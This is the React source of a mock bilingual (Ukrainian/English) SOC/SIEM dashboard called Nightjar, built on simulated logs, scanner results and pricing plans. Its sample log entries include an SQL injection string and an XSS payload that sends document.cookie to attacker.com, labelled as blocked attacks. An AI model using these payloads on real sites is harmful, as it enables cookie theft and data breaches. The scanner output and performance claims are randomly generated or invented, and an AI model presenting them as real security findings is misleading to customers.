import React, { useState, useEffect, useRef } from 'react';
import { 
  Shield, 
  ShieldAlert, 
  ShieldCheck, 
  Terminal, 
  Activity, 
  AlertTriangle, 
  Lock, 
  Unlock, 
  Zap, 
  Search, 
  Filter, 
  Server, 
  Cpu, 
  Globe, 
  DollarSign, 
  FileText, 
  UserCheck, 
  Users, 
  Sliders, 
  CheckCircle2, 
  XCircle, 
  Play, 
  RefreshCw, 
  Radio, 
  Crosshair, 
  Wrench, 
  ArrowUpRight,
  Eye,
  LogOut,
  ChevronRight,
  Bell,
  Bird,
  CreditCard,
  Clock,
  Check,
  Pause,
  Maximize2,
  MessageSquare,
  Send,
  Bot
} from 'lucide-react';

const NightjarLogoIcon = ({ className = "w-5 h-5" }) => (
  <svg className={className} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" className="text-rose-600 fill-rose-600/20" stroke="currentColor" strokeWidth="2" />
    <path d="M12 7.5c-2.2 1.3-4.8 1.8-7 1.5 2.2 1.5 4.5 2.5 7 4.5 2.5-2 4.8-3 7-4.5-2.2 0.3-4.8-0.2-7-1.5z" className="fill-cyan-300 stroke-cyan-300" />
    <path d="M12 12v4.5" strokeWidth="2" className="stroke-emerald-400" />
    <path d="M12 16.5l-2.2 2m2.2-2l2.2 2" strokeWidth="1.5" className="stroke-emerald-400" />
  </svg>
);

const TRANSLATIONS = {
  ua: {
    systemTag: "СИСТЕМА БЕЗПЕРЕРВНОГО МОНІТОРИНГУ 24/7",
    socAdmin: "SOC АДМІН",
    client: "КЛІЄНТ",
    protection247: "ЗАХИСТ 24/7",
    ingestRate: "ІНГЕСТ",
    credits: "КРЕДИТИ",
    tabDashboard: "ОБЗОР БЕЗПЕРЕКИ",
    tabLogs: "SIEM ЛЕНТА (24/7 STREAM)",
    tabScanner: "СКАНЕР УРАЗЛИВОСТЕЙ",
    tabRemediation: "ПАТЧИНГ & ЗАЯВКИ",
    tabPricing: "АБОНПЛАТА 24/7",
    tabAdmin: "SOC КОНСОЛЬ",
    heroBadge: "СИСТЕМА АКТИВНОГО ПЕРЕХОПЛЕННЯ ЗАГРОЗ NIGHTJAR 24/7",
    heroSlogan: "«Ваш спокій -- це наша турбота. Бережіть свої сили та нерви. Ми ніколи не спимо»",
    heroSub: "Круглосуточний автоматизований комплекс WAF & SIEM. Ми моніторимо веб-додатки клієнтів у реальному часі, відсікаємо 99.9% атак до їх проникнення та миттєво усуваємо виявлені уразливості.",
    btnConnect: "ПОДKЛЮЧИТИ 24/7 ЗАХИСТ",
    btnCheckVuln: "ПЕРЕВІРИТИ УРАЗЛИВОСТІ",
    videoTitle: "ДАШБОРД-МОНІТОР: ЕКВАЛАЙЗЕР ЖИВИХ АТАК",
    videoScenario: "СЦЕНАРІЙ",
    videoIntercepted: "ПЕРЕХОПЛЕНО",
    healthIndex: "ІНДЕКС ЗДОРОВ'Я БЕЗПЕРЕКИ",
    healthSub: "АКТИВНІ CVE ТА WAF КОНФІГУРАЦІЯ",
    activeVulns: "АКТИВНИХ УРАЗЛИВОСТЕЙ",
    activeVulnsSub: "ПОТРЕБУЮТЬ ПАТЧИНГУ SOC ІНЖЕНЕРАМИ",
    blockedAttacks: "ЗАБЛОКОВАНО АТАК 24/7",
    blockedAttacksSub: "SQLi, XSS, DDOS ЗА 7 ДНІВ",
    creditsBalance: "БАЛАНС ЗАХИСТУ (CR)",
    creditsSub: "ДОСТУПНО ДЛЯ АВТО-УСУНЕННЯ БАГІВ",
    latestLogsTitle: "ОСТАННІ СОБИЦІ SIEM (LIVE STREAM 24/7)",
    viewAllLogs: "ПЕРЕГЛЯД УСІХ ЛОГІВ",
    protectedSites: "ОБ'ЄКТИ ПІД 24/7 ЗАХИСТОМ",
    latency: "ЗАДЕРЖКА",
    scannerTitle: "СКАНУВАННЯ САЙТІВ ТА ВЕБ-ДОДАТКІВ",
    scannerDesc: "ВВЕДІТЬ ДОМЕН АБО URL ВАШОГО ДОДАТКУ. СКУНЕР NIGHTJAR ПРОВЕДЕ СИМУЛЯЦІЮ ВЕКТОРІВ АТАК (SQLI, XSS, ПОРТИ, TLS) ТА СФОРМУЄ ЗВІТ ПРО CVE.",
    scanPlaceholder: "HTTPS://YOUR-COMPANY.COM",
    btnStartScan: "ЗАПУСТИТИ СКАНУВАННЯ",
    scanning: "СКАНУВАННЯ ПЕРИМЕТРУ...",
    pricingTitle: "ТАРИФИ АБОНЕНТСЬКОГО МОНІТОРИНГУ 24/7",
    pricingDesc: "ПОДКЛЮЧІТЬ ВАШ САЙТ АБО ВЕБ-ДОДАТОК ДО ПОСТІЙНОГО КРУГЛОСУТОЧНОГО ЗАХИСТУ NIGHTJAR SOC. НАША СИСТЕМА БЕЗПЕРЕРВНО ПЕРЕХОПЛЮЄ АТАКИ.",
    monthly: "ОПЛАТА ЕЖЕМЕСЯЧНО",
    yearly: "ОПЛАТА ЗА РІК",
    discount20: "ЗНИЖКА 20%",
    currentPlan: "ПОТОЧНИЙ АКТИВНИЙ ПЛАН",
    selectPlan: "ПОДКЛЮЧИТИ ТАРИФ 24/7",
    autoRenew: "АВТОПРОДОВЖЕННЯ: ВКЛ",
    aiChatTitle: "NIGHTJAR AI КОНСУЛЬТАНТ",
    aiChatPlaceholder: "Запитайте про безпеку або захист 24/7...",
    aiInitialMessage: "Вітаю! Я автономний AI-консультант Nightjar SOC. Чим можу допомогти захистити ваш проект сьогодні?"
  },
  en: {
    systemTag: "24/7 CONTINUOUS MONITORING SYSTEM",
    socAdmin: "SOC ADMIN",
    client: "CLIENT",
    protection247: "24/7 PROTECTION",
    ingestRate: "INGEST",
    credits: "CREDITS",
    tabDashboard: "SECURITY OVERVIEW",
    tabLogs: "SIEM STREAM (24/7 LIVE)",
    tabScanner: "VULN SCANNER",
    tabRemediation: "PATCHING & TICKETS",
    tabPricing: "24/7 SUBSCRIPTION",
    tabAdmin: "SOC CONSOLE",
    heroBadge: "NIGHTJAR 24/7 ACTIVE THREAT INTERCEPTION SYSTEM",
    heroSlogan: "Your peace of mind is our priority. Save your energy and nerves. We never sleep",
    heroSub: "24/7 automated WAF & SIEM security suite. We monitor client web applications in real time, intercept 99.9% of cyber threats before intrusion, and patch vulnerabilities immediately.",
    btnConnect: "ENABLE 24/7 PROTECTION",
    btnCheckVuln: "SCAN FOR VULNERABILITIES",
    videoTitle: "DASHBOARD MONITOR: REAL-TIME ATTACK EQUALIZER",
    videoScenario: "SCENARIO",
    videoIntercepted: "INTERCEPTED",
    healthIndex: "SECURITY HEALTH INDEX",
    healthSub: "BASED ON ACTIVE CVES & WAF CONFIG",
    activeVulns: "ACTIVE VULNERABILITIES",
    activeVulnsSub: "REQUIRES SOC ENGINEER PATCHING",
    blockedAttacks: "BLOCKED ATTACKS 24/7",
    blockedAttacksSub: "SQLi, XSS, DDOS IN 7 DAYS",
    creditsBalance: "PROTECTION CREDITS (CR)",
    creditsSub: "AVAILABLE FOR AUTO-BUG FIXING",
    latestLogsTitle: "LATEST SIEM EVENTS (LIVE STREAM 24/7)",
    viewAllLogs: "VIEW ALL LOGS",
    protectedSites: "24/7 PROTECTED ASSETS",
    latency: "LATENCY",
    scannerTitle: "WEBSITE & WEB APP VULNERABILITY PROBE",
    scannerDesc: "ENTER YOUR APPLICATION DOMAIN OR URL. THE NIGHTJAR SCANNER WILL SIMULATE ATTACK VECTORS (SQLI, XSS, PORTS, TLS) AND GENERATE A CVE REPORT.",
    scanPlaceholder: "HTTPS://YOUR-COMPANY.COM",
    btnStartScan: "START SCANNING",
    scanning: "SCANNING PERIMETER...",
    pricingTitle: "24/7 MANAGED SECURITY SUBSCRIPTION PLANS",
    pricingDesc: "CONNECT YOUR WEBSITE OR WEB APPLICATION TO NIGHTJAR SOC 24/7 CONTINUOUS PROTECTION. OUR SYSTEM INTERCEPTS THREATS NON-STOP.",
    monthly: "BILL MONTHLY",
    yearly: "BILL YEARLY",
    discount20: "SAVE 20%",
    currentPlan: "CURRENT ACTIVE PLAN",
    selectPlan: "SUBSCRIBE 24/7",
    autoRenew: "AUTO-RENEW: ON",
    aiChatTitle: "NIGHTJAR AI ASSISTANT",
    aiChatPlaceholder: "Ask about security or 24/7 protection...",
    aiInitialMessage: "Hello! I am Nightjar SOC AI Consultant. How can I help secure your project today?"
  }
};

const INITIAL_LOGS = [
  { id: 'LOG-8902', timestamp: '10:14:02', source: 'waf.app-1.internal', target: 'https://client-corp.com/api/v1/login', severity: 'CRITICAL', type: 'SQLi Attempt', status: 'BLOCKED', payload: "UNION SELECT username, password FROM users --", IP: '185.220.101.4' },
  { id: 'LOG-8901', timestamp: '10:13:55', source: 'ping-scanner', target: 'https://client-corp.com', severity: 'INFO', type: 'Health Check 24/7', status: 'SUCCESS', responseTime: '42ms', IP: '10.0.4.12' },
  { id: 'LOG-8900', timestamp: '10:13:12', source: 'auth-gateway', target: 'https://admin.client-corp.com', severity: 'WARNING', type: 'Brute Force Auth', status: 'ALERTED', payload: "Failed logins count: 14/min", IP: '45.154.255.82' },
  { id: 'LOG-8899', timestamp: '10:12:40', source: 'vuln-scanner', target: 'https://store-app.io', severity: 'HIGH', type: 'Outdated SSL/TLS', status: 'DETECTED', payload: "TLS 1.0 supported (CVE-2014-3566)", IP: '10.0.4.15' },
  { id: 'LOG-8898', timestamp: '10:11:05', source: 'waf.app-2.internal', target: 'https://store-app.io/checkout', severity: 'CRITICAL', type: 'XSS Attack', status: 'BLOCKED', payload: "<script>fetch('http://attacker.com/cookie?c='+document.cookie)</script>", IP: '198.51.100.44' },
  { id: 'LOG-8897', timestamp: '10:09:30', source: 'ping-scanner', target: 'https://store-app.io', severity: 'INFO', type: 'Latency Monitoring', status: 'SUCCESS', responseTime: '68ms', IP: '10.0.4.12' },
];

const INITIAL_VULNS = [
  { id: 'VULN-101', target: 'https://client-corp.com', title: "SQL-ін'єкція в точці /api/v1/search", cve: 'CVE-2024-8891', severity: 'CRITICAL', price: 450, status: 'OPEN', description: 'Параметр search не проходить фільтрацію спецсимволів. Можливий витік бази даних.' },
  { id: 'VULN-102', target: 'https://store-app.io', title: 'Застаріла версія Nginx (1.18.0) - RCE', cve: 'CVE-2023-44487', severity: 'HIGH', price: 280, status: 'OPEN', description: 'Уразливість до HTTP/2 Rapid Reset та віддаленого виконання коду.' },
  { id: 'VULN-103', target: 'https://client-corp.com', title: 'Відсутній заголовок Content-Security-Policy', cve: 'CWE-693', severity: 'LOW', price: 90, status: 'RESOLVED', description: 'Відсутність CSP дозволяє впроваджувати сторонні скрипти.' },
];

const SUBSCRIPTION_PLANS = [
  {
    id: 'starter',
    name: 'Starter Guard 24/7',
    price: 199,
    period: 'mo',
    description: 'Basic 24/7 security monitoring for small websites & micro-services.',
    features: [
      'Uptime & Health checks 24/7 (every 5 min)',
      'Automated WAF with OWASP Top 10 protection',
      'Telegram / Email instant threat alerts',
      'Weekly security health reports',
      '100 free remediation credits included'
    ],
    popular: false
  },
  {
    id: 'pro',
    name: 'Pro Perimeter 24/7',
    price: 599,
    period: 'mo',
    description: 'Full continuous defense for e-commerce, SaaS, and mission-critical applications.',
    features: [
      'Real-time continuous SIEM log ingestion',
      'Auto vulnerability scanning every 6 hours',
      'Dedicated Nightjar SOC analyst on-call 24/7',
      'Priority SLA for patching (2 hours max)',
      '300 remediation credits monthly',
      'Deep forensic analysis & incident reports'
    ],
    popular: true
  },
  {
    id: 'enterprise',
    name: 'Enterprise SOC Shield',
    price: 1499,
    period: 'mo',
    description: 'Custom SOC perimeter for corporate networks, fintech, and high-load infrastructure.',
    features: [
      'Dedicated virtual SOC team (Tier 1-3)',
      'Zero-latency 24/7/365 perimeter scanning',
      '15-minute SLA for critical threat reaction',
      'Custom firewall rules & automated patching',
      '1000 remediation credits monthly',
      'Personal Cybersecurity Account Manager'
    ],
    popular: false
  }
];

export default function App() {
  const [lang, setLang] = useState('ua');
  const t = TRANSLATIONS[lang];

  const [activeTab, setActiveTab] = useState('dashboard');
  const [viewMode, setViewMode] = useState('SOC_ADMIN');
  const [logs, setLogs] = useState(INITIAL_LOGS);
  const [vulnerabilities, setVulnerabilities] = useState(INITIAL_VULNS);
  const [credits, setCredits] = useState(1200);
  
  // Еквалайзер відео-монітора
  const [videoScenario, setVideoScenario] = useState('DDoS');
  const [isVideoPlaying, setIsVideoPlaying] = useState(true);
  const [interceptedCount, setInterceptedCount] = useState(1482);
  const [eqHeights, setEqHeights] = useState([40, 75, 20, 90, 60, 30, 85, 100, 45, 70, 30, 95, 50, 80, 20, 60]);

  // Стан AI Консультанта в правому нижньому кутку
  const [isAiOpen, setIsAiOpen] = useState(false);
  const [aiMessages, setAiMessages] = useState([
    { sender: 'ai', text: t.aiInitialMessage }
  ]);
  const [aiInput, setAiInput] = useState('');

  const [currentSubscription, setCurrentSubscription] = useState({
    planId: 'pro',
    planName: 'Pro Perimeter 24/7',
    status: 'ACTIVE',
    nextBillingDate: '2026-09-01',
    autoRenew: true
  });
  const [billingCycle, setBillingCycle] = useState('monthly');

  const [scanUrl, setScanUrl] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [scanResult, setScanResult] = useState(null);

  const [logFilterSeverity, setLogFilterSeverity] = useState('ALL');
  const [logSearchQuery, setLogSearchQuery] = useState('');

  const [tickets, setTickets] = useState([
    { id: 'TKT-701', vulnId: 'VULN-103', title: 'Настройка CSP заголовков', client: 'Client Corp', cost: 90, status: 'COMPLETED', date: '2026-08-03' }
  ]);

  const [isSimulatingAttack, setIsSimulatingAttack] = useState(false);
  const [selectedLogDetail, setSelectedLogDetail] = useState(null);
  const [firewallBlockIPs, setFirewallBlockIPs] = useState(['185.220.101.4', '45.154.255.82']);

  // Динамічний еквалайзер та логи
  useEffect(() => {
    const interval = setInterval(() => {
      // Рандомізуємо висоту стовпчиків еквалайзера
      setEqHeights(prev => prev.map(() => Math.floor(15 + Math.random() * 85)));

      const randomType = Math.random();
      const newId = `LOG-${Math.floor(8900 + Math.random() * 1000)}`;
      const now = new Date().toTimeString().split(' ')[0];
      let newLog;

      if (randomType > 0.75) {
        newLog = {
          id: newId,
          timestamp: now,
          source: 'waf.edge-guard',
          target: 'https://client-corp.com/auth',
          severity: 'HIGH',
          type: 'CSRF Token Bypass Attempt',
          status: 'BLOCKED',
          payload: 'X-CSRF-Token: null; Origin: malicious.net',
          IP: `194.26.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        };
      } else if (randomType > 0.45) {
        newLog = {
          id: newId,
          timestamp: now,
          source: 'ping-scanner',
          target: Math.random() > 0.5 ? 'https://client-corp.com' : 'https://store-app.io',
          severity: 'INFO',
          type: 'Active Ping Monitoring 24/7',
          status: 'SUCCESS',
          responseTime: `${Math.floor(25 + Math.random() * 45)}ms`,
          IP: '10.0.4.12'
        };
      } else {
        newLog = {
          id: newId,
          timestamp: now,
          source: 'ids.sensor-1',
          target: 'https://store-app.io/api/data',
          severity: 'WARNING',
          type: 'Rate Limit Exceeded',
          status: 'THROTTLED',
          payload: 'Requests: 180 req/sec',
          IP: `91.240.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        };
      }

      setLogs(prev => [newLog, ...prev.slice(0, 49)]);
      if (isVideoPlaying) {
        setInterceptedCount(prev => prev + 1);
      }
    }, 1500);

    return () => clearInterval(interval);
  }, [isVideoPlaying]);

  const handleSendAiMessage = (e) => {
    e.preventDefault();
    if (!aiInput.trim()) return;

    const userMsg = aiInput;
    setAiMessages(prev => [...prev, { sender: 'user', text: userMsg }]);
    setAiInput('');

    setTimeout(() => {
      let reply = "Nightjar SOC працює у штатному режимі 24/7. Усі запити проходять крізь багаторівневий фільтр.";
      if (userMsg.toLowerCase().includes('цена') || userMsg.toLowerCase().includes('тариф') || userMsg.toLowerCase().includes('ціна')) {
        reply = "Наші тарифи 24/7 починаються від $199/міс (Starter Guard). Рекомендуємо Pro Perimeter ($599/міс) для повного захисту.";
      } else if (userMsg.toLowerCase().includes('взлом') || userMsg.toLowerCase().includes('атак')) {
        reply = "Система автоматично блокує DDoS та SQLi за 0.02мс. Ви можете перевірити це у відео-еквалайзері на головній сторінці.";
      }
      setAiMessages(prev => [...prev, { sender: 'ai', text: reply }]);
    }, 1000);
  };

  const handleSelectPlan = (plan) => {
    setCurrentSubscription({
      planId: plan.id,
      planName: plan.name,
      status: 'ACTIVE',
      nextBillingDate: '2026-09-04',
      autoRenew: true
    });
    alert(lang === 'ua' ? `Ви успішно підключили цілодобовий захист 24/7 за тарифом "${plan.name}"!` : `You have successfully enabled 24/7 protection under "${plan.name}" plan!`);
  };

  const runActiveScan = (e) => {
    e.preventDefault();
    if (!scanUrl) return;

    setIsScanning(true);
    setScanResult(null);

    setTimeout(() => {
      setIsScanning(false);
      const isClean = Math.random() > 0.6;
      const detectedVulns = isClean ? [] : [
        {
          id: `VULN-${Math.floor(200 + Math.random() * 800)}`,
          target: scanUrl,
          title: 'Виявлено відкритий порт MongoDB без авторизації (Port 27017)',
          cve: 'CVE-2019-2386',
          severity: 'CRITICAL',
          price: 350,
          status: 'OPEN',
          description: 'БД MongoDB доступна з зовнішньої мережі без запиту логіна та пароля.'
        },
        {
          id: `VULN-${Math.floor(200 + Math.random() * 800)}`,
          target: scanUrl,
          title: 'Уразливість CORS (Wildcard Access Control)',
          cve: 'CWE-942',
          severity: 'MEDIUM',
          price: 150,
          status: 'OPEN',
          description: 'Заголовок Access-Control-Allow-Origin задано як *, що дозволяє стороннім сайтам читати дані.'
        }
      ];

      setScanResult({
        target: scanUrl,
        timestamp: new Date().toLocaleString(),
        score: isClean ? 98 : 42,
        foundCount: detectedVulns.length,
        items: detectedVulns
      });

      if (detectedVulns.length > 0) {
        setVulnerabilities(prev => [...detectedVulns, ...prev]);
      }
    }, 3000);
  };

  const orderRemediation = (vuln) => {
    if (credits < vuln.price) {
      alert(lang === 'ua' ? "Недостатньо кредитів на балансі. Поповніть рахунок." : "Insufficient credits. Please top up.");
      return;
    }

    setCredits(prev => prev - vuln.price);
    setVulnerabilities(prev => prev.map(v => v.id === vuln.id ? { ...v, status: 'IN_PROGRESS' } : v));
    
    const newTicket = {
      id: `TKT-${Math.floor(800 + Math.random() * 100)}`,
      vulnId: vuln.id,
      title: vuln.title,
      client: vuln.target,
      cost: vuln.price,
      status: 'IN_PROGRESS',
      date: new Date().toISOString().split('T')[0]
    };

    setTickets(prev => [newTicket, ...prev]);
  };

  const resolveTicket = (ticketId, vulnId) => {
    setTickets(prev => prev.map(t => t.id === ticketId ? { ...t, status: 'COMPLETED' } : t));
    setVulnerabilities(prev => prev.map(v => v.id === vulnId ? { ...v, status: 'RESOLVED' } : v));
  };

  const injectSimulatedThreat = (threatType) => {
    setIsSimulatingAttack(true);
    setTimeout(() => {
      setIsSimulatingAttack(false);
      const attackLog = {
        id: `LOG-SIM-${Math.floor(100 + Math.random() * 900)}`,
        timestamp: new Date().toTimeString().split(' ')[0],
        source: 'INJECTOR_SIMULATOR',
        target: 'https://client-corp.com/checkout',
        severity: 'CRITICAL',
        type: threatType,
        status: 'BLOCKED_BY_SOC',
        payload: `ATTACK_PAYLOAD_TEST: ${threatType} triggered manually from SOC Console`,
        IP: '185.220.101.666'
      };
      setLogs(prev => [attackLog, ...prev]);
    }, 1200);
  };

  const blockIP = (ip) => {
    if (!firewallBlockIPs.includes(ip)) {
      setFirewallBlockIPs(prev => [...prev, ip]);
    }
  };

  const filteredLogs = logs.filter(log => {
    const matchesSev = logFilterSeverity === 'ALL' || log.severity === logFilterSeverity;
    const matchesSearch = log.type.toLowerCase().includes(logSearchQuery.toLowerCase()) || 
                          log.target.toLowerCase().includes(logSearchQuery.toLowerCase()) ||
                          log.IP.includes(logSearchQuery);
    return matchesSev && matchesSearch;
  });

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-mono selection:bg-rose-600 selection:text-slate-950 uppercase tracking-tight relative">
      <header className="border-b border-rose-900/40 bg-slate-900/90 backdrop-blur-md sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3 cursor-pointer" onClick={() => setActiveTab('dashboard')}>
            <div className="w-10 h-10 border border-rose-600/60 bg-slate-950 flex items-center justify-center shadow-lg shadow-rose-950/50">
              <NightjarLogoIcon className="w-6 h-6 animate-pulse" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-black text-lg tracking-widest text-slate-100 font-mono">
                  NIGHTJAR <span className="text-rose-500">SIEM</span>
                </span>
                <span className="text-[9px] bg-rose-950 text-rose-400 border border-rose-800 px-1.5 py-0.5 font-bold">
                  v3.4-STRICT
                </span>
              </div>
              <p className="text-[9px] text-slate-400 tracking-wider">[{t.systemTag}]</p>
            </div>
          </div>

          <div className="hidden md:flex items-center gap-4 text-xs">
            <div className="flex items-center border border-slate-800 bg-slate-950 font-bold">
              <button 
                onClick={() => setLang('ua')}
                className={`px-2 py-1 text-[10px] transition-all ${lang === 'ua' ? 'bg-rose-600 text-slate-950 font-black' : 'text-slate-400 hover:text-slate-100'}`}
              >
                UA
              </button>
              <button 
                onClick={() => setLang('en')}
                className={`px-2 py-1 text-[10px] transition-all ${lang === 'en' ? 'bg-rose-600 text-slate-950 font-black' : 'text-slate-400 hover:text-slate-100'}`}
              >
                EN
              </button>
            </div>

            <div 
              onClick={() => setActiveTab('pricing')}
              className="flex items-center gap-2 bg-slate-950 border border-emerald-500/50 px-3 py-1.5 cursor-pointer hover:border-emerald-400 transition-all text-emerald-400 font-bold"
            >
              <Clock className="w-3.5 h-3.5 animate-spin" />
              <span>{t.protection247}:</span>
              <span className="text-slate-100">{currentSubscription.planName}</span>
            </div>

            <div className="flex items-center gap-2 bg-slate-950 border border-slate-800 px-3 py-1.5">
              <Activity className="w-3.5 h-3.5 text-cyan-400" />
              <span className="text-slate-400">{t.ingestRate}:</span>
              <span className="text-cyan-400 font-bold">142 EPS</span>
            </div>

            <div className="flex items-center gap-2 bg-slate-950 border border-slate-800 px-3 py-1.5">
              <DollarSign className="w-3.5 h-3.5 text-yellow-400" />
              <span className="text-slate-400">{t.credits}:</span>
              <span className="text-yellow-400 font-bold">{credits} CR</span>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={() => setViewMode(prev => prev === 'SOC_ADMIN' ? 'CLIENT' : 'SOC_ADMIN')}
              className={`px-3 py-1.5 border text-xs font-bold transition-all flex items-center gap-2 ${
                viewMode === 'SOC_ADMIN'
                  ? 'bg-rose-950 border-rose-600 text-rose-300 shadow-md shadow-rose-950'
                  : 'bg-slate-900 border-slate-700 text-cyan-300'
              }`}
            >
              <Sliders className="w-3.5 h-3.5" />
              <span>{viewMode === 'SOC_ADMIN' ? t.socAdmin : t.client}</span>
            </button>
          </div>
        </div>
      </header>

      <nav className="bg-slate-900 border-b border-slate-800 px-4">
        <div className="max-w-7xl mx-auto flex overflow-x-auto gap-1 py-2">
          {[
            { id: 'dashboard', label: t.tabDashboard, icon: Shield },
            { id: 'logs', label: t.tabLogs, icon: Terminal, badge: logs.length },
            { id: 'scanner', label: t.tabScanner, icon: Crosshair },
            { id: 'remediation', label: t.tabRemediation, icon: Wrench, badge: vulnerabilities.filter(v => v.status === 'OPEN').length },
            { id: 'pricing', label: t.tabPricing, icon: CreditCard, highlight: true },
            { id: 'admin', label: t.tabAdmin, icon: Cpu, isSpecial: true },
          ].map(tab => {
            const Icon = tab.icon;
            const isActive = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 px-4 py-2 text-xs font-bold whitespace-nowrap transition-all border ${
                  isActive
                    ? tab.isSpecial 
                      ? 'bg-rose-600 text-slate-950 border-rose-500 font-black' 
                      : 'bg-rose-950/80 text-rose-300 border-rose-500'
                    : tab.highlight
                      ? 'bg-emerald-950/30 text-emerald-400 border-emerald-800 hover:bg-emerald-900/40'
                      : 'bg-slate-950/40 text-slate-400 border-slate-850 hover:text-slate-100 hover:bg-slate-900'
                }`}
              >
                <Icon className="w-3.5 h-3.5" />
                <span>{tab.label}</span>
                {tab.badge !== undefined && (
                  <span className={`px-1.5 py-0.2 text-[9px] font-mono ${isActive ? 'bg-rose-500 text-slate-950' : 'bg-slate-850 text-slate-400'}`}>
                    {tab.badge}
                  </span>
                )}
              </button>
            );
          })}
        </div>
      </nav>

      <main className="max-w-7xl mx-auto px-4 py-8 space-y-8">
        {activeTab === 'dashboard' && (
          <div className="space-y-8 animate-fade-in">
            <div className="bg-slate-900 border-2 border-rose-600/40 p-6 md:p-8 relative overflow-hidden">
              <div className="grid lg:grid-cols-12 gap-8 items-center">
                <div className="lg:col-span-6 space-y-4">
                  <div className="inline-flex items-center gap-2 px-3 py-1 bg-rose-950 border border-rose-800 text-xs text-rose-300 font-mono font-bold">
                    <Radio className="w-3.5 h-3.5 animate-pulse text-rose-500" />
                    <span>{t.heroBadge}</span>
                  </div>

                  <h1 className="text-2xl sm:text-3xl font-black text-slate-100 tracking-tight leading-tight uppercase font-mono">
                    {t.heroSlogan}
                  </h1>

                  <p className="text-xs text-slate-400 leading-relaxed uppercase">
                    {t.heroSub}
                  </p>

                  <div className="flex flex-wrap gap-3 pt-2">
                    <button 
                      onClick={() => setActiveTab('pricing')}
                      className="px-5 py-3 bg-rose-600 hover:bg-rose-500 text-slate-950 font-black text-xs transition-all border border-rose-400 flex items-center gap-2 shadow-lg shadow-rose-950"
                    >
                      <Clock className="w-4 h-4" /> {t.btnConnect}
                    </button>
                    <button 
                      onClick={() => setActiveTab('scanner')}
                      className="px-5 py-3 bg-slate-950 hover:bg-slate-850 text-slate-200 font-bold text-xs transition-all border border-slate-800 flex items-center gap-2"
                    >
                      <Crosshair className="w-4 h-4 text-rose-500" /> {t.btnCheckVuln}
                    </button>
                  </div>
                </div>

                {/* ДАШБОРД ВІДЕО-МОНІТОРА У ВИГЛЯДІ ЖИВОГО ЕКВАЛАЙЗЕРА */}
                <div className="lg:col-span-6 bg-slate-950 border-2 border-slate-800 p-4 space-y-3 shadow-2xl relative">
                  <div className="flex items-center justify-between pb-2 border-b border-slate-850 text-xs font-bold text-slate-300">
                    <div className="flex items-center gap-2">
                      <span className="w-2.5 h-2.5 bg-rose-500 rounded-full animate-ping"></span>
                      <span>{t.videoTitle}</span>
                    </div>
                    <span className="text-[10px] text-emerald-400 font-mono">FREQ_ANALYZER: ONLINE</span>
                  </div>

                  <div className="bg-slate-900 border border-slate-800 h-60 relative overflow-hidden flex flex-col justify-between p-4 font-mono">
                    <div className="absolute inset-0 opacity-15 bg-[radial-gradient(#f43f5e_1px,transparent_1px)] [background-size:16px_16px] pointer-events-none"></div>

                    <div className="flex justify-between items-center text-[10px] text-slate-400 relative z-10">
                      <span>{t.videoScenario}: <strong className="text-rose-400">{videoScenario} ATTACK VECTOR</strong></span>
                      <span>{t.videoIntercepted}: <strong className="text-emerald-400">{interceptedCount} ATTACKS</strong></span>
                    </div>

                    {/* ДАШБОРД-ЕКВАЛАЙЗЕР (АВТОМАТИЧНІ СТОВПЧИКИ ЧАСТОТ АТАК) */}
                    <div className="flex items-end justify-between gap-1 h-32 relative z-10 px-2 bg-slate-950/50 border border-slate-850 py-2">
                      {eqHeights.map((h, i) => (
                        <div key={i} className="w-full flex flex-col justify-end items-center h-full gap-1">
                          <div 
                            style={{ height: `${h}%` }} 
                            className={`w-full transition-all duration-300 ${
                              h > 75 ? 'bg-rose-500 shadow-sm shadow-rose-500' : h > 45 ? 'bg-yellow-400' : 'bg-cyan-500'
                            }`}
                          ></div>
                          <span className="text-[7px] text-slate-500">{i * 2}k</span>
                        </div>
                      ))}
                    </div>

                    <div className="flex justify-between items-center text-[9px] text-slate-400 relative z-10 pt-1">
                      <span className="text-rose-400">[WAF SHIELD ACTIVE]</span>
                      <span className="text-emerald-400">LATENCY: 0.01ms</span>
                    </div>
                  </div>

                  <div className="flex items-center justify-between gap-2 pt-1 text-[10px]">
                    <span className="text-slate-500 font-bold">MODE:</span>
                    <div className="flex gap-1">
                      {['DDoS', 'SQLi', 'ZeroDay'].map(sc => (
                        <button
                          key={sc}
                          onClick={() => setVideoScenario(sc)}
                          className={`px-2.5 py-1 border font-bold transition-all ${
                            videoScenario === sc 
                              ? 'bg-rose-950 text-rose-300 border-rose-500' 
                              : 'bg-slate-900 text-slate-400 border-slate-800 hover:bg-slate-850'
                          }`}
                        >
                          {sc}
                        </button>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 font-mono">
              <div className="bg-slate-900 p-5 border border-slate-800 space-y-2">
                <div className="flex justify-between items-center text-slate-400 text-xs">
                  <span>{t.healthIndex}</span>
                  <ShieldCheck className="w-4 h-4 text-emerald-400" />
                </div>
                <div className="text-3xl font-black text-emerald-400">88 / 100</div>
                <div className="text-[10px] text-slate-500">{t.healthSub}</div>
              </div>

              <div className="bg-slate-900 p-5 border border-slate-800 space-y-2">
                <div className="flex justify-between items-center text-slate-400 text-xs">
                  <span>{t.activeVulns}</span>
                  <AlertTriangle className="w-4 h-4 text-yellow-400" />
                </div>
                <div className="text-3xl font-black text-yellow-400">
                  {vulnerabilities.filter(v => v.status === 'OPEN').length}
                </div>
                <div className="text-[10px] text-slate-500">{t.activeVulnsSub}</div>
              </div>

              <div className="bg-slate-900 p-5 border border-slate-800 space-y-2">
                <div className="flex justify-between items-center text-slate-400 text-xs">
                  <span>{t.blockedAttacks}</span>
                  <ShieldAlert className="w-4 h-4 text-rose-500" />
                </div>
                <div className="text-3xl font-black text-rose-500">{interceptedCount}</div>
